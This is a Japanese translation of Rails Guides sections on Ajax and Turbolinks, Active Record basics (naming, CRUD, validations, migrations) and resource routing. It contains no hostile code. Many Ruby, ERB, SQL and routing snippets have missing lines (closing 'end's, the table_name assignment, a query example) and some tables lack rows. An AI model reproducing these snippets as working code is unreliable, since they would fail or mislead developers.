indexビュー (`app/views/users/index.html.erb`) の内容は以下のようになります。
<b>Users</b>
<ul id="users">
<%= render @users %>
</ul>
<%= form_for(@user, remote: true) do |f| %>
  <%= f.label :name %><br>
  <%= f.text_field :name %>
  <%= f.submit %>
`app/views/users/_user.html.erb`パーシャルの内容は以下のようになります。
<li><%= user.name %></li>
indexページの上部にはユーザーの一覧が表示されます。
下部にはユーザー作成用のフォームが表示されます。
下部のフォームは`UsersController`の`create`アクションを呼び出します。
フォームのremoteオプションがオンになっているので、リクエストはAjaxリクエストとして`UsersController`に渡され、JavaScriptを探します。
this
# app/controllers/users_controller.rb
  # ......
  def create
    @user = User.new(params[:user])
    respond_to do |format|
      if @user.save
        format.html { redirect_to @user, notice: 'User was successfully created.' 
        format.js   {}
        format.json { render json: @user, status: :created, location: @user }
      else
        format.html { render action: "new" }
        format.json { render json: @user.errors, status: :unprocessable_entity }
      end
format.jsが`respond_to`ブロックの中にある点にご注目ください。これによって、 コントローラがAjaxリクエストに応答できるようになります。
続いて、対応する`app/views/users/create.js.erb`ビューファイルを作成します。実際のJavaScriptはこのビューで生成され、クライアントに送信されてそこで実行されます。
$("<%= escape_javascript(render @user) %>").appendTo("#users");
Turbolinks
Rails 4には[Turbolinks gem](https://github.com/rails/turbolinks)が同梱されています。
このgemでは、ページのレンダリングを多くのページで高速化するのにAjaxを使用しています。
### Turbolinksの動作原理
Turbolinksは、ページにあるすべての`<a>`にクリックハンドラを1つずつ追加します。
続いて、TurbolinksはPushStateを使用してURLを正しいものに書き換え、リフレッシュのセマンティクスを維持しながらプリティURLを与えます。
Turbolinksを有効にするには、TurbolinksをGemfileに追加し、CoffeeScriptのマニフェスト (通常は`app/assets/javascripts/application.js`) に`//= require turbolinks`を追加します。
Turbolinksを特定のリンクでのみ無効にしたい場合は、タグに`data-no-turbolink`属性を追加します。
<a href="..." data-no-turbolink>No turbolinks here</a>.
### ページ変更イベント
CoffeeScriptコードを開発中、ページ読み込みに関連する処理を追加したくなることがよくあります。
jQueryを使用するのであれば、たとえば以下のようなコードを書くことがあるでしょう。
  alert "page has loaded!"
しかし、通常のページ読み込みプロセスはTurbolinksによって上書きされてしまうため、ページ読み込みに依存するイベントはトリガされません。
このようなコードがある場合は、以下のように書き換えなければなりません。
$(document).on "page:change", ->
この他にバインド可能なイベントなどの詳細については、[Turbolinks README](https://github.com/rails/turbolinks/blob/master/README.md)を参照してください。
その他の情報源
詳細の学習に役立つリンクをいくつか紹介します。
* [jquery-ujs wiki](https://github.com/rails/jquery-ujs/wiki)
* [jquery-ujsに関する外部記事のリスト](https://github.com/rails/jquery-ujs/wiki/External-articles)
* [Rails 3 Remote LinksとFormsについて: 決定版ガイド](http://www.alfajango.com/blog/rails-3-remote-links-and-forms/)
* [Railscasts: 控えめなJavaScript](http://railscasts.com/episodes/205-unobtrusive-javascript)
* [Railscasts: Turbolinks](http://railscasts.com/episodes/390-turbolinks?language=ja&view=asciicast) (日本語)
Active Record の基礎
====================
このガイドではActive Recordの基礎について説明します。
* ORM (オブジェクトリレーショナルマッピング) とActive Recordについて、およびRailsでの利用方法
* Active RecordとMVC (Model-View-Controller)パラダイムの親和性
* Active Recordモデルを使用してリレーショナルデータベースに保存されたデータを操作する
* Active Recordスキーマにおける名前付けルール
* データベースのマイグレーション、検証(validation)、コールバック
Active Recordについて
Active Recordとは、[MVC](http://ja.wikipedia.org/wiki/Model_View_Controller)で言うところのM、つまりモデルに相当するものであり、ビジネスデータとビジネスロジックを表すシステムの階層です。
Active Recordは、データベースに恒久的に保存される必要のあるビジネスオブジェクトの作成と利用を円滑に行なえるようにします。
Active Recordは、ORM (オブジェクトリレーショナルマッピング) システムに記述されている「Active Recordパターン」を実装したものであり、同じ名前が付けられています。
### Active Recordパターン
[Active RecordはMartin Fowlerによって](http://www.martinfowler.com/eaaCatalog/activeRecord.html) _Patterns of Enterprise Application Architecture_ という書籍で記述されました。
Active Recordにおいて、オブジェクトとは永続的なデータであり、そのデータに対する振る舞いでもあります。
### O/Rマッピング
オブジェクトリレーショナルマッピング (O/RマッピングやORMと略されることもあります)とは、アプリケーションが持つリッチなオブジェクトをリレーショナルデータベース(RDBMS)のテーブルに接続するものです。
ORMを使用することで、SQL文を直接書く代りにわずかなアクセスコードを書くだけで、アプリケーションにおけるオブジェクトの属性やリレーションシップをデータベースに保存したりデータベースから読み出したりすることができるようになります。
### ORMフレームワークとしてのActive Record
Active Recordにはさまざまな機能が搭載されており、その中でも以下のものが特に重要です。
* モデルおよびモデル内のデータを表現する
* モデル間の関連付け(アソシエーション)を表現する
* 関連するモデルを介した継承階層を表現する
* データがデータベースに永続的に保存される前に検証(validation)を行なう
* オブジェクト指向の表記方法でデータベースを操作する
Active RecordにおけるCoC(Convention over Configuration)
他のプログラミング言語やフレームワークを使用してアプリケーションを作成すると、設定のためのコードを大量に書く必要が生じがちです。
一般的なORMアプリケーションでは特にこの傾向があります。
しかし、Railsに適合するルールに従っていれば、Active Recordモデルを作成するときに、設定のために書かなければならないコードは最小限で済みます。場合によっては設定のためのコードが完全に不要であることすらあります。
これは、アプリケーションの設定がほとんどの場合で同じならば、それをデフォルトにすべきであるという考えに基づいています。
つまり、明示的な設定が必要となるのは標準のルールだけでは不足がある場合のみということです。
### 命名ルール
Active Recordには、モデルとデータベースのテーブルとのマッピング作成時に従うべきルールがいくつかあります。
Railsでは、データベースのテーブル名を見つけるときに、モデルのクラス名を複数形にしたものを使用します。
つまり、`Book`というモデルクラスがある場合、これに対応するデータベースのテーブルは複数形の**books**になります。
Railsの複数形化メカニズムは非常に強力で、不規則な語であっても複数形にしたり単数形にしたりできます(person <-> peopleなど)。
モデルのクラス名が2語以上の複合語である場合、Rubyの慣習であるキャメルケース(CamelCaseのように語頭を大文字にしてスペースなしでつなぐ)に従ってください。一方、テーブル名は(camel_caseなどのように)小文字かつアンダースコアで区切られなければなりません。
以下の例を参照ください。
* データベースのテーブル - 複数形であり、語はアンダースコアで区切られる (例: `book_clubs`)
* モデルのクラス - 単数形であり、語頭を大文字にする (例: `BookClub`)
| モデル / クラス | テーブル / スキーマ |
| `LineItem`    | `line_items`   |
| `Deer`        | `deers`        |
| `Mouse`       | `mice`         |
| `Person`      | `people`       |
### スキーマのルール
Active Recordでは、データベースのテーブルで使用されるカラムの名前についても、利用目的に応じてルールがあります。
* **外部キー** - このカラムは `テーブル名の単数形_id` にする必要があります (例 `item_id`、`order_id`)
これらのカラムは、Active Recordがモデル間の関連付けを作成するときに参照されます。
* **主キー** - デフォルトでは `id` という名前を持つintegerのカラムをテーブルの主キーとして使用します。
このカラムは、[Active Recordマイグレーション](migrations.html)を使用してテーブルを作成するときに自動的に作成されます。
他にも、Active Recordインスタンスに機能を追加するカラム名がいくつかあります。
* `created_at` - レコードが作成された時に現在の日付時刻が自動的に設定されます
* `updated_at` - レコードが更新されたときに現在の日付時刻が自動的に設定されます
* `lock_version` - モデルに[optimistic locking](http://api.rubyonrails.org/classes/ActiveRecord/Locking.html)を追加します
* `関連付け名_type` - [ポリモーフィック関連付け](association_basics.html#ポリモーフィック関連付け)の種類を保存します
* `テーブル名_count` - 関連付けにおいて、所属しているオブジェクトの数をキャッシュするのに使用されます。
NOTE: これらのカラム名は必須ではありませんが、Active Recordに予約されています。
特殊なことをするのでなければ、これらの予約済みカラム名の使用は避けてください。
たとえば、`type`という語はテーブルでSingle Table Inheritance (STI)を指定するために予約されています。
STIを使用しないとしても、予約語より先にまず"context"などのような、モデルのデータを適切に表す語を検討してください。
Active Recordのモデルを作成する
Active Recordモデルの作成は非常に簡単です。
以下のように`ActiveRecord::Base`クラスのサブクラスを作成するだけで完了します。
class Product < ActiveRecord::Base
上のコードは、`Product`モデルを作成し、データベースの`products`テーブルにマッピングされます。
さらに、テーブルに含まれている各行のカラムを、作成したモデルのインスタンスの属性にマッピングします。
以下のSQL文で`products`テーブルを作成したとします。
CREATE TABLE products (
   id int(11) NOT NULL auto_increment,
   name varchar(255),
   PRIMARY KEY  (id)
上のテーブルスキーマに従って、以下のようなコードをいきなり書くことができます。
p = Product.new
p.name = "Some Book"
puts p.name # "Some Book"
命名ルールを上書きする
Railsアプリケーションで別の命名ルールを使用しなければならない、レガシデータベースを使用してRailsアプリケーションを作成しないといけないなどの場合にはどうすればよいでしょうか。
そんなときにはデフォルトの命名ルールを簡単にオーバーライドできます。
`ActiveRecord::Base.table_name=`メソッドを使用して、使用すべきテーブル名を明示的に指定できます。
  self
`ActiveRecord::Base.primary_key=`メソッドを使用して、テーブルの主キーとして使用されるカラム名もオーバーライドできます。
  self.primary_key = "product_id"
CRUD: データの読み書き
------------------------------
CRUDとは、4つのデータベース操作を表す **C** reate、 **R** ead、 **U** pdate、 **D** eleteの頭字語です。
Active Recordはこれらのメソッドを自動的に作成し、これによってアプリケーションはテーブルに保存されているデータを操作することができます。
### Create
Active Recordのオブジェクトはハッシュやブロックから作成することができます。また、作成後に属性を手動で追加できます。
`new`メソッドを実行すると単に新しいオブジェクトが返されますが、`create`を実行すると新しいオブジェクトが返され、さらにデータベースに保存されます。
たとえば、`User`というモデルに`name`と`occupation`という属性があるとすると、`create`メソッドを実行すると新しいレコードが1つ作成され、データベースに保存されます。
user = User.create(name: "David", occupation: "Code Artist")
`new`メソッドを使用した場合は、オブジェクトは保存されずにインスタンス化されます。
user = User.new
user.name = "David"
user.occupation = "Code Artist"
この場合、`user.save`を実行して初めてデータベースにレコードがコミットされます。
最後に、`create`や`new`にブロックが渡されると、新しいオブジェクトは初期化のためにブロックに渡されます。
user = User.new do |u|
  u.name = "David"
  u.occupation = "Code Artist"
### Read
Active Recordは、データベース内のデータにアクセスするためのリッチなAPIを提供します。
以下は、Active Recordによって提供されるさまざまなデータアクセスメソッドのほんの一例です。
# すべてのユーザーのコレクションを返す
users = User.all
# 最初のユーザーを返す
user = User.first
# Davidという名前を持つ最初のユーザーを返す
david = User.find_by(name: 'David')
# 名前がDavidで、職業がコードアーティストのユーザーをすべて返し、created_atカラムで逆順ソートする
Active Recordモデルへのクエリについては[Active Recordクエリインターフェイス](active_record_querying.html)ガイドで詳細を説明します。
### Update
Active Recordオブジェクトをひとたび取得すると、オブジェクトの属性を変更してデータベースに保存できるようになります。
user = User.find_by(name: 'David')
user.name = 'Dave'
user.save
上のコードをもっと短くするのであれば、属性名と、設定したい値をマッピングするハッシュを使用して次のように書きます。
user.update(name: 'Dave')
これは多くの属性を一度に更新したい場合に特に便利です。
さらに、複数のレコードを一度に更新したいのであれば、`update_all`というクラスメソッドが便利です。
User.update_all "max_login_attempts = 3, must_change_password = 'true'"
### Delete
他のメソッドと同様、Active Recordオブジェクトをひとたび取得すれば、そのオブジェクトをdestroyすることでデータベースから削除できます。
user.destroy
検証(validation)
-----------
Active Recordを使用して、モデルがデータベースに書き込まれる前にモデルの状態を検証することができます。
モデルをチェックするためのさまざまなメソッドが用意されています。属性が空でないこと、一意であること、既にデータベースにないこと、特定のフォーマットに従っていることなど、多岐にわたった検証が行えます。
以下の例で簡単に説明します。
  validates :name, presence: true
 # => false
# => ActiveRecord::RecordInvalid: Validation failed: Name can't be blank
検証の詳細については[Active Record検証ガイド](active_record_validations.html)を参照してください。
Active Recordコールバックを使用することで、モデルのライフサイクルにおける特定のイベント実行時にコードをアタッチして実行することができます。
これにより、モデルで特定のイベントが発生したときにコードが透過的に実行されるようになります。レコードの作成、更新、削除などさまざまなイベントに対してコールバックを設定できます。
コールバックの詳細については[Active Recordコールバックガイド](active_record_callbacks.html)を参照してください。
マイグレーション
Railsにはデータベーススキーマを管理するためのドメイン固有言語(DSL: Domain Specific Language)があり、マイグレーション(migration)と呼ばれています。
マイグレーションはファイルに保存されます。`rake`を実行すると、Active Recordがサポートするあらゆるデータベースに対してマイグレーションが実行されます。
以下はテーブルを作成するマイグレーションです。
class CreatePublications < ActiveRecord::Migration
  def change
    create_table :publications do |t|
      t.string :title
      t.text :description
      t.references :publication_type
      t.integer :publisher_id
      t.string :publisher_type
      t.boolean :single_issue
      t.timestamps
    add_index :publications, :publication_type_id
Railsはどのマイグレーションファイルがデータベースにコミットされたかを把握しており、その情報を使用してロールバック機能を提供しています。
テーブルを実際に作成するには`rake db:migrate`を実行します。ロールバックするには`rake db:rollback`を実行します。
上のマイグレーションコードはデータベースに依存していないことにご注目ください。MySQL、PostgreSQL、Oracleなど多くのデータベースに対して実行できます。
マイグレーションの詳細については[Active Recordマイグレーションガイド](migrations.html)を参照してください。
Rails のルーティング
=================================
このガイドでは、開発者に向けてRailsのルーティング機能を解説します (訳注: routeとrootを区別するため、訳文ではrouteを基本的に「ルーティング」と訳します)。
* `routes.rb`のコードの読み方
* 独自のルーティング作成法 (リソースベースのルーティングが推奨されますが、`match`メソッドによるルーティングも可能です)
* アクション側で受け取るパラメータ
* ルーティングヘルパーを使用してパスやURLを自動生成する方法
* 制限追加やRackエンドポイントなどの高度な手法
Railsルーターの目的
-------------------------------
Railsのルーターは受け取ったURLを認識し、適切なコントローラ内アクションに割り当てます。
ルーターは、ビューでこれらのパスやURLを直接ハードコードすることを避けるためにパスやURLを生成することもできます。
### URLを実際のコードに割り振る
Railsアプリケーションが以下のHTTPリクエストを受け取ったとします。
GET /patients/17
このリクエストは、特定のコントローラ内アクションにマッチさせるようルーターに要求しています。
最初にマッチしたのが以下のルーティングだとします。
get '/patients/:id', to: 'patients#show'
このリクエストは`patients`コントローラの`show`アクションに割り当てられ、`params`には`{ id: '17' }`ハッシュが含まれています。
### コードからパスやURLを生成する
パスやURLを生成することもできます。
たとえば、上のルーティングが以下のように変更されたとします。
get '/patients/:id', to: 'patients#show', as: 'patient'
そして、アプリケーションのコントローラに以下のコードがあるとします。
@patient = Patient.find(17)
上記に対応するビューは以下です。
<%= link_to 'Patient Record', patient_path(@patient) %>
これで、ルーターによって`/patients/17`というパスが生成されます。
これを利用することでビューが改修しやすくなり、コードも読みやすくなります。
このルーティングヘルパーではidを指定する必要がない点にご注目ください。
リソースベースのルーティング: Railsのデフォルト
-----------------------------------
リソースベースのルーティング (以下リソースルーティング) を使用することで、リソースベースで構成されたコントローラに対応する共通のルーティングを手軽に宣言できます。
リソースフルなルーティングを宣言することで、コントローラの`index`、`show`、`new`、`edit`、`create`、`update`、`destroy`アクションを個別に宣言しなくても1行で宣言が完了します。
### Web上のリソース
ブラウザはRailsに対してリクエストを送信する際に、特定のHTTPメソッド (`GET`、`POST`、`PATCH`、`PUT`、`DELETE`など) を使用して、URLに対するリクエストを作成します。
上に述べたHTTPメソッドは、いずれもリソースに対して特定の操作の実行を指示するリクエストです。
リソースルーティングでは、関連するさまざまなリクエストを1つのコントローラ内のアクションに割り当てます。
DELETE /photos/17
resources :photos
Railsはこのリクエストを`photos`コントローラ内の`destroy`アクションに割り当て、`params`ハッシュに`{ id: '17' }`を含めます。
### CRUD、動詞、アクション
Railsのリソースフルルーティングでは、(GET、PUTなどの) 各種HTTP動詞 (verb) と、コントローラ内アクションを指すURLが対応付けられます。
1つのアクションは、データベース上での特定のCRUD (Create/Read/Update/Delete) 操作に対応付けられるルールになっています。
たとえば、以下のようなルーティングが1つあるとします。
上の記述により、アプリケーション内に以下の7つのルーティングが作成され、いずれも`Photos`コントローラに対応付けられます。
| HTTP動詞 | パス             | コントローラ#アクション | 目的                                     |
| --------- | ---------------- | ----------------- | -------------------------------------------- |
| GET       | /photos          | photos#index      | すべての写真の一覧を表示                 |
| GET       | /photos/new      | photos#new        | 写真を1つ作成するためのHTMLフォームを返す |
| POST      | /photos          | photos#create     | 写真を1つ作成する                           |
| GET       | /photos/:id      | photos#show       | 特定の写真を表示する                     |
| GET       | /photos/:id/edit | photos#edit       | 写真編集用のHTMLフォームを1つ返す      |
| PATCH/PUT | /photos/:id      | photos#update     | 特定の写真を更新する                      |
| DELETE    | /photos/:id      | photos#destroy    | 特定の写真を削除する                      |
NOTE: Railsのルーターでは、サーバーへのリクエストをマッチさせる際にHTTP動詞とURLを使用しているため、4種類のURL (GET/POST/PATCH/DELETE) が7種類の異なるアクション (index/new/create/show/edit/update/destroy) に割り当てられています。
NOTE: Railsのルーティングは、ルーティングファイルの「上からの記載順に」マッチします。このため、たとえば`resources :photos`というルーティングが`get 'photos/poll'`よりも前の行にあれば、`resources`行の`show`アクションが`get`行の記述よりも優先されますので、`get`行のルーティングは有効になりません。
これを修正するには、`get`行を`resorces`行 **よりも上** の行に移動してください。これにより、`get`行がマッチするようになります。
### パスとURL用ヘルパー
リソースフルなルーティングを作成すると、アプリケーションのコントローラで多くのヘルパーが利用できるようになります。
`resources :photos`というルーティングを例に取ってみましょう。
* `photos_path`は`/photos`を返します
* `new_photo_path`は`/photos/new`を返します
* `edit_photo_path(:id)`は`/photos/:id/edit`を返します (`edit_photo_path(10)`であれば`/photos/10/edit`が返されます)
* `photo_path(:id)`は`/photos/:id`を返します。 (`photo_path(10)`であれば`/photos/10`が返されます)
これらの_pathヘルパーには、それぞれに対応する`_url`ヘルパー (`photos_url`など) があります。_urlヘルパーは、_pathの前に現在のホスト名、ポート番号、パスのプレフィックスが追加されている点が異なります。
### 複数のリソースを同時に定義する
リソースをいくつも定義しなければならない場合は、以下のような略記法で一度に定義することでタイプ量を節約できます。
resources :photos, :books, :videos
上の記法は以下と完全に同一です。
resources :books
resources :videos
### 単数形リソース
場合によっては、ユーザーがページを表示する時にidを参照することのないリソースが使用されることがあります。
たとえば、`/profile`では常に「現在ログインしているユーザー自身」のプロファイルを表示し、他のユーザーidを参照する必要がないとします。
このような場合には、単数形リソース (singular resource) を使用して`show`アクションに (`/profile/:id`ではなく) `/profile`を割り当てることができます。
get 'profile', to: 'users#show'
`get`の引数に`文字列`を渡す場合は`コントローラ#アクション`形式であることが前提ですが、`get`の引数に`シンボル`を渡すとアクションに直接割り当てられます。
get 'profile', to: :show
上をリソースフルなルーティングで記述すると以下のようになります。
resource :geocoder
上のルーティングでは以下の6つのルーティングが作成され、すべて`Geocoders`コントローラに割り当てられます。
| HTTP動詞 | パス             | コントローラ#アクション | 目的                                     |
| --------- | -------------- | ----------------- | --------------------------------------------- |
| GET       | /geocoder/new  | geocoders#new     | geocoder作成用のHTMLフォームを返す |
| POST      | /geocoder      | geocoders#create  | geocoderを作成する                       |
| GET       | /geocoder      | geocoders#show    | 1つしかないgeocoderリソースを表示する    |
| GET       | /geocoder/edit | geocoders#edit    | geocoder編集用のHTMLフォームを返す  |
| PATCH/PUT | /geocoder      | geocoders#update  | 1つしかないgeocoderリソースを更新する     |
| DELETE    | /geocoder      | geocoders#destroy | geocoderリソースを削除する                  |
NOTE: 単数形リソースは複数形のコントローラに割り当てられます。これは、同じコントローラで単数形のルーティング (`/account`) と複数形のルーティング (`/accounts/45`) を両方使いたい場合を想定しているためです。
従って、`resource :photo`と`resources :photos`のどちらも、単数形ルーティングと複数形ルーティングを両方作成し、同一のコントローラ (`PhotosController`) に割り当てられます。
単数形のリソースフルなルーティングを使用すると、以下のヘルパーメソッドが生成されます。
* `new_geocoder_path`は`/geocoder/new`を返します
* `edit_geocoder_path`は`/geocoder/edit`を返します
* `geocoder_path`は`/geocoder`を返します。
複数形リソースの場合と同様に、単数形リソースでも_pathヘルパーに対応する`_url`ヘルパーが使用できます。_urlヘルパーは、_pathの前に現在のホスト名、ポート番号、パスのプレフィックスが追加されている点が異なります。
WARNING: ある[長年の未解決バグ](https://github.com/rails/rails/issues/1769) が原因で、`form_for`では単数形リソースを自動的に扱えません。
これを解決するには、以下のようにフォームのurlを直接指定します。
form_for @geocoder, url: geocoder_path do |f|
### コントローラの名前空間とルーティング
コントローラを名前空間によってグループ化することもできます。
最もよく使用される名前空間といえば、多数の管理用コントローラ群をまとめる`Admin::`名前空間でしょう。
これらのコントローラを`app/controllers/admin`ディレクトリに配置し、ルーティングでこれらをグループ化できます。
namespace :admin do
| HTTP 動詞 | パス                  | コントローラ#アクション   | 名前付きヘルパー              |
scope module: 'admin' do
以下のようにブロックを使用しない記述も可能です。
scope '/admin' do
いずれの場合も、名前付きルート (named route)は、`scope`を使用しなかった場合と同じであることにご注目ください。
| HTTP 動詞 | パス                  | コントローラ#アクション   | 名前付きヘルパー              |
TIP: _`namespace`ブロックの内部で異なるコントローラ名前空間を使用したいのであれば、「`get '/foo' => '/foo#index'`」のような絶対コントローラパスを指定することもできます。_
### ネストしたリソース
論理上、他のリソースの配下に子リソースを配置することはよくあります。
たとえば、Railsアプリケーションに以下のモデルがあるとします。
class Magazine < ActiveRecord::Base
  has_many :ads
class Ad < ActiveRecord::Base
  belongs_to :magazine
ルーティングをネストする (入れ子にする) ことで、この親子関係をルーティングで表すことができるようになります。
上の例の場合、以下のようにルーティングを宣言することができます。
resources :magazines do
  resources :ads
上のルーティングによって、雑誌 (magazine) へのルーティングに加えて、広告 (ad) を`AdsController`にルーティングすることもできるようになりました。
adへのURLにはmagazineもなければなりません。
| HTTP動詞 | パス             | コントローラ#アクション | 目的                                     |
| --------- | ------------------------------------ | ----------------- | -------------------------------------------------------------------------- |
| GET       | /magazines/:magazine_id/ads          | ads#index         | ある雑誌1冊に含まれる広告をすべて表示する                          |
| GET       | /magazines/:magazine_id/ads/new      | ads#new           | ある1冊の雑誌用の広告を1つ作成するHTMLフォームを返す |
| POST      | /magazines/:magazine_id/ads          | ads#create        | ある1冊の雑誌用の広告を1つ作成する                           |
| GET       | /magazines/:magazine_id/ads/:id      | ads#show          | ある雑誌1冊に含まれる広告を1つ表示する                    |
| GET       | /magazines/:magazine_id/ads/:id/edit | ads#edit          | ある雑誌1冊に含まれる広告1つを編集するHTMLフォームを返す     |
| PATCH/PUT | /magazines/:magazine_id/ads/:id      | ads#update        | ある雑誌1冊に含まれる広告を1つ更新する                      |
| DELETE    | /magazines/:magazine_id/ads/:id      | ads#destroy       | ある雑誌1冊に含まれる広告を1つ削除する                      |
ルーティングを作成すると、ルーティングヘルパーも作成されます。ヘルパーは`magazine_ads_url`や`edit_magazine_ad_path`のような名前になります。
これらのヘルパーは、最初のパラメータとしてMagazineモデルのインスタンスを1つ取ります (`magazine_ads_url(@magazine)`)。
#### ネスティング回数の限界
ネストしたリソースの中でさらに別のリソースをネストすることは可能です。
例：
resources :publishers do
  resources :magazines do
    resources :photos
すぐ想像が付くと思いますが、ネストが深くなるとたちまち扱いが厄介になります。
たとえば、上のルーティングはアプリケーションで以下のようなパスとして認識されます。
/publishers/1/magazines/2/photos/3
このURLに対応するルーティングヘルパーは`publisher_magazine_photo_url`となります。このヘルパーを使用するには毎回3つの階層すべてでオブジェクトを指定する必要があります。
ネスティングが深くなることでルーティングの扱いが困難になる問題については、Jamis Buckの有名な [記事](http://weblog.jamisbuck.org/2007/2/5/nesting-resources) を参照してください。JamisはRailsアプリケーション設計上のよい経験則を提案しています。
TIP: _リソースのネスティングは、ぜひとも1回にとどめて下さい。決して2回以上ネストするべきではありません。_
#### 「浅い」ネスト
前述したような深いネストを避けるひとつの方法として、コレクション (index/new/createのような、idを持たないアクション) だけを親のスコープの下で生成するという手法があります。このとき、メンバー (show/edit/update/destroyのような、idを必要とするアクション) をネストに含めないのがポイントです。これによりコレクションだけが階層化のメリットを受けられます。
つまり、以下のように最小限の情報でリソースを一意に指定できるルーティングを作成するということです。
  resources :comments, only: [:index, :new, :create]
resources :comments, only: [:show, :edit, :update, :destroy]
この方法は、ルーティングの記述を複雑にせず、かつ深いネストを作らないという絶妙なバランスを保っています。
`:shallow`オプションを使用することで、上と同じ内容をさらに簡単に記述できます。
  resources :comments, shallow: true
これによって生成されるルーティングは、最初の例と完全に同じです。
親リソースで`:shallow`オプションを指定すると、すべてのネストしたリソースが浅くなります。
  resources :comments
  resources :quotes
  resources :drafts
DSL (ドメイン固有言語) である`shallow`メソッドをルーティングで使用すると、すべてのネストが浅くなるように内側にスコープを1つ作成します。
これによって生成されるルーティングは、最初の例と完全に同じです。
shallow do
  resources :comments
    resources :quotes
    resources :drafts
`scope`メソッドには、「浅い」ルーティングをカスタマイズするためのオプションが2つあります。
`:shallow_path`オプションは、指定されたパラメータをメンバーのパスの冒頭にだけ追加します。
scope shallow_path: "sekret" do
    resources :comments, shallow: true
上の場合、commentsリソースのルーティングは以下のようになります。
| HTTP 動詞 | パス                  | コントローラ#アクション   | 名前付きヘルパー              |
--------------------------------------------
-----------------
| GET       | /sekret/comments/:id/edit(.:format)    | comments#edit     | edit_comment_path     |
| GET       | /sekret/comments/:id(.:format)         | comments#show     | comment_path          |
| PATCH/PUT | /sekret/comments/:id(.:format)         | comments#update   | comment_path          |
| DELETE    | /sekret/comments/:id(.:format)         | comments#destroy  | comment_path          |
`:shallow_prefix`オプションを使用すると、指定されたパラメータを (パスではなく) 名前付きヘルパー名の冒頭に追加します。
scope shallow_prefix: "sekret" do
| HTTP 動詞 | パス                  | コントローラ#アクション   | 名前付きヘルパー              |
| GET       | /comments/:id/edit(.:format)           | comments#edit     | edit_sekret_comment_path |
| GET       | /comments/:id(.:format)                | comments#show     | sekret_comment_path      |
| PATCH/PUT | /comments/:id(.:format)                | comments#update   | sekret_comment_path      |
| DELETE    | /comments/:id(.:format)                | comments#destroy  | sekret_comment_path      |
### ルーティングの「concern」機能
concernを使用することで、他のリソースやルーティング内で使いまわせる共通のルーティングを宣言することができます。
concernは以下のように定義します。
concern :commentable do
concern :image_attachable do
  resources :images, only: :index
concernを利用すると、同じようなルーティングを繰り返し記述せずに済み、複数のルーティング間で同じ動作を共有できます。
resources :messages, concerns: :commentable
上のコードは以下と同等です。
resources :messages do
concernはルーティング内のどのような場所にでも配置することができます。スコープや名前空間呼び出しでの使用法は以下のとおりです。
  concerns :commentable
### オブジェクトからパスとURLを作成する
ルーティングヘルパーを使用する方法の他に、パラメータの配列からパスやURLを作成することもできます。
例として、以下のようなルーティングがあるとします。
`magazine_ad_path`を使用すると、idを数字で渡す代りに`Magazine`と`Ad`のインスタンスを引数として渡すことができます。
<%= link_to 'Ad details', magazine_ad_path(@magazine, @ad) %>
複数のオブジェクトが集まったセットに対して`url_for`を使用することもできます。複数のオブジェクトを渡しても、適切なルーティングが自動的に決定されます。
<%= link_to 'Ad details', url_for([@magazine, @ad]) %>
上の場合、Railsは`@magazine`が`Magazine`であり、`@ad`が`Ad`であることを認識し、それに基づいて`magazine_ad_path`ヘルパーを呼び出します。
`link_to`などのヘルパーでも、完全な`url_for`呼び出しの代りに単にオブジェクトを渡すことができます。
<%= link_to 'Ad details', [@magazine, @ad] %>
1冊の雑誌にだけリンクしたいのであれば、以下のように書きます。
<%= link_to 'Magazine details', @magazine %>
それ以外のアクションであれば、配列の最初の要素にアクション名を挿入するだけで済みます。
<%= link_to 'Edit Ad', [:edit, @magazine, @ad] %>
これにより、モデルのインスタンスをURLとして扱うことができます。これはリソースフルなスタイルを採用する大きなメリットの1つです。
### RESTfulなアクションをさらに追加する
デフォルトで作成されるRESTfulなルーティングは7つですが、7つでなければならないということはありません。
必要であれば、コレクションやコレクションの各メンバーに対して適用されるリソースを追加することもできます。
#### メンバールーティングを追加する
メンバー (member) ルーティングを追加したい場合は、`member`ブロックをリソースブロックに1つ追加します。
resources :photos do
  member do
    get 'preview'
上のルーティングはGETリクエストとそれに伴う`/photos/1/preview`を認識し、リクエストを`Photos`コントローラの`preview`アクションにルーティングし、リソースid値を`params[:id]`に渡します。
同時に、`preview_photo_url`ヘルパーと`preview_photo_path`ヘルパーも作成されます。
memberルーティングブロックの内側では、次に述べるHTTP動詞が指定されたルーティング名を認識できます。
`member`ルーティングが1つだけしかないのであれば、以下のようにルーティングで`:on`オプションを指定することでブロックを省略できます。
  get 'preview', on: :member
`:on`オプションを省略しても同様のmemberルーティングが生成されます。この場合リソースidの値の取得に`params[:id]`ではなく`params[:photo_id]`を使用する点が異なります。
#### コレクションルーティングを追加する
ルーティングにコレクション (collection) を追加するには以下のようにします。
  collection do
    get 'search'
上のルーティングは、GETリクエスト+`/photos/search`などの (idを伴わない) パスを認識し、リクエストを`Photos`コントローラの`search`アクションにルーティングします。
このとき`search_photos_url`や`search_photos_path`ルーティングヘルパーも同時に作成されます。
collectionルーティングでもmemberルーティングのときと同様に`:on`オプションを使用できます。
  get 'search', on: :collection
#### 追加されたnewアクションへのルーティングを追加する
`:on`オプションを使用して、たとえば以下のように別のnewアクションを追加できます。
resources :comments do
  get 'preview', on: :new
上のようにすることで、GET + `/comments/new/preview`のようなパスが認識され、`Comments`コントローラの`preview`アクションにルーティングされます。
`preview_new_comment_url`や`preview_new_comment_path`ルーティングヘルパーも同時に作成されます。
TIP: リソースフルなルーティングにアクションが多数追加されていることに気付いたら、それ以上アクションを追加するのをやめて、そこに別のリソースが隠されているのではないかと疑ってみる方がよいでしょう。
リソースフルでないルーティング
Railsではリソースルーティングを行なう他に、任意のURLをアクションにルーティングすることもできます。
この方式を使用する場合、リソースフルルーティングのような自動的なルーティンググループの生成は行われません。
従って、アプリケーションで必要なルーティングを個別に設定することになります。
基本的にはリソースフルルーティングを使用すべきではありますが、このような単純なルーティングの方が適している箇所も多数あるはずです。
リソースフルルーティングでは大袈裟過ぎる場合に、アプリケーションを無理にリソースフルなフレームワークに押し込める必要はありません。
シンプルルーティングは、特に従来形式のURLを新しいRailsのアクションに割り当てることがずっと簡単に行えるようになります。
### パラメータの割り当て
通常のルーティングを設定するのであれば、RailsがルーティングをブラウザからのHTTPリクエストに割り当てるためのシンボルをいくつか渡します。
それらのシンボルのうち、`:controller`と`:action`は特別です。`:controller`はアプリケーションのコントローラへの割り当てを行い、`:action`はそのコントローラの中にあるアクションへの割り当てを行います (訳注: 具体的なコントローラ名とアクション名を指定していない点にご注目ください)。
以下のルーティングを例にとってみましょう。
get ':controller(/:action(/:id))'
